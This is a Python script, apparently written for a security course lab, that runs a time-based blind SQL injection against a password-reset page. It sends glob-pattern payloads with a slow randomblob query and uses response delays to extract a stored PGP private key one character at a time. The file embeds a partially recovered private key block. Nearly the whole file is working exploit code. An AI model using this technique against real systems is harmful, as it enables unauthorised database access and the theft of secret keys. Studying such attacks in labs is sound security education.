#!/bin/python

adress = "lbs-course.askarov.net"
port = 3030
page = "reset"

#SQL
injectionStart="admin' and key glob "
slowQuery = "and length(hex(randomblob(9999999)))"
injectionEnd = ";--"

maxDelay = 0.2

keySoFar = """-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: GnuPG v1

lQOYBFcDxHUBCAC6pKKopQL1d39769zBTcoAS/it4rjies8sEmqlw4Yl/CfWMLPr
rzsL0wk/gdsWDDs42aK0pgpWbo/2YrbTHyf1uV0ucXO6jLy7xfwBQoenLWiApgYv
1LecOc8GX+GK9dkRYt5iBctDnB/5tIPMbu6LCcfNECZlO6l8EiihZXB3SYMCTKwY
uW6rx66ac8VAcs0AfYkQgQh8lFtv"""

import urllib as url
import time
import thread

def encode(key):
    injection = injectionStart + "'" +key+"'" + slowQuery + injectionEnd
    #print(injection)
    return url.urlencode({'username': injection})

def queryOnce(key):
    injection = encode(key)
    target = "http://"+adress+":"+str(port)+"/"+page
    
    #print(target)
    start = time.time()
    url.urlopen(target,data=injection)
    end = time.time()
    return end-start

def isCorrect(time):
    return time>maxDelay

def findNextChar(currentKey,tries=0):
    for i in range(127,0,-1):
        if(i==ord('?') or i==ord('*')):
            continue
        #time.sleep(1)
        duration = queryOnce(currentKey+str(chr(i))+"*")
        if isCorrect(duration):
            print(currentKey+chr(i))
            return currentKey+chr(i)
    #something went wrong
    if isCorrect(queryOnce(currentKey)):
        print("Cant find next char in this key:\n"+currentKey+"\ntrying again\n")
        if(tries>10):
            print("Tried 10 times and failed, current key is:\n"+currentKey)
            f = open('keySoFar.txt','w')
            f.write(currentKey)
            f.close()
        else:
            return findNextChar(currentKey,tries=tries+1)
    else:
        print("Incorrect key accepted once:\n"+currentKey)
        if currentKey!='':
            return findNextChar(currentKey[:-1])
    

def main():
    f = open('keySoFar.txt','r')
    key = f.read()
    f.close()
    for i in range(0,3508):
        key = findNextChar(key)
        if i%10==0 and isCorrect(queryOnce(key)):
            print('writing to file')
            f = open('keySoFar.txt','w')
            f.write(key)
            f.close()
    return

if __name__ == "__main__":
    main()
